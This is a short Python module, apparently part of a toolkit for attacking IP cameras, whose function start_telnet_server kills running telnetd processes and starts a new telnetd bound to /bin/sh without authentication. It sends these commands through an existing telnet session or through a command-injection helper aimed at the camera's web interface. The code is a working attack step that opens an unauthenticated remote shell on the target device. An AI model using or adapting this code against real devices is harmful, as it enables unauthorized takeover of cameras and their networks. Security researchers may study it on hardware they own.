from .. import scripts
from .. import decorators
import logging

"""
Imports:
    ..scripts
    ..decorators
    logging

Contains:
    start_telnet_server
"""

logger = logging.getLogger(__name__)
logger.info(f'Library imported: {__name__}')

@decorators.debug()
def start_telnet_server(http=None, telnet=None, port=23, auth=False, kill_all=True):
    """
    Attempts to start a telnet server on the camera

    :param telnet - A <Telnet> instance
    :param http - A <Http> instance
    :param port - The telnet port to start the server on
        ... Leave this as the default 23 unless really
        ... required
    :param auth - If False, the telnet server will not
        ... require authentication from connections
    :param kill_all - If True, kills all telnet servers
        ... already running
    """

    tag_port = f'-p {port}' if port != 23 else ''
    tag_exec = '-l /bin/sh' if not auth else ''

    tags = ' '.join((tag_port, tag_exec,)).strip()

    payload_killall = 'killall telnetd'
    payload_telnet = f'telnetd {tags}'

    if telnet is not None:
        if kill_all:
            resp_killall = telnet.execute(payload_killall)

        resp_telnet = telnet.execute(payload_telnet)

        return True # Assumed
    elif http is not None:
        if kill_all:
            resp_killall = scripts.command_inject(http, payload_killall, blind=True, clear=False)

        resp_telnet = scripts.command_inject(http, payload_telnet, blind=True, clear=True)

        return True # Assumed
    else:
        logger.debug('Neither a telnet, not a http instance were provided')

        return False
